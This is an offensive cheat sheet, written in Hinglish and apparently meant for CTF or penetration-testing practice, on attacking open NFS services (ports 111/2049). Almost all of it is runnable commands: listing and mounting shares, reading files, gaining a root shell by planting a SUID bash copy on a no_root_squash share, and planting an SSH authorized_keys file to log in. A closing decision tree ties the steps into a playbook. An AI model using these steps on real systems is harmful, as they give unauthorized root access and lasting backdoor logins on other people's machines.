# 🔓 NFS PORT OPEN (111/2049) — Ab Kya?

---

## CASE 1: Shares List Karo
```bash
showmount -e <IP>
nmap --script nfs-showmount -p 111 <IP>
```

---

## CASE 2: Mount Karo — Files Browse
```bash
mkdir /tmp/nfs_mount
mount -t nfs <IP>:/shared_folder /tmp/nfs_mount
ls -la /tmp/nfs_mount/
cat /tmp/nfs_mount/flag.txt
```

---

## CASE 3: No Root Squash → Privesc
```bash
# showmount output mein "no_root_squash" dikhe toh:
# 1. Mount karo
mount -t nfs <IP>:/share /tmp/nfs
# 2. SUID binary create karo
cp /bin/bash /tmp/nfs/bash_root
chmod +s /tmp/nfs/bash_root
# 3. Target pe execute:
/share/bash_root -p    # root shell!
```

---

## CASE 4: SSH Key Plant Karo
```bash
# Agar /home/user share mila:
mount -t nfs <IP>:/home/user /tmp/nfs
mkdir /tmp/nfs/.ssh
ssh-keygen -t rsa -f /tmp/key -N ""
cat /tmp/key.pub > /tmp/nfs/.ssh/authorized_keys
chmod 600 /tmp/nfs/.ssh/authorized_keys
ssh -i /tmp/key user@<IP>
```

---

## QUICK DECISION:
```
NFS open (111/2049)
  ├─ showmount -e <IP> → list shares
  ├─ mount -t nfs <IP>:/share /tmp/nfs → browse files
  ├─ no_root_squash? → SUID binary privesc
  └─ /home share? → plant SSH key → login
```
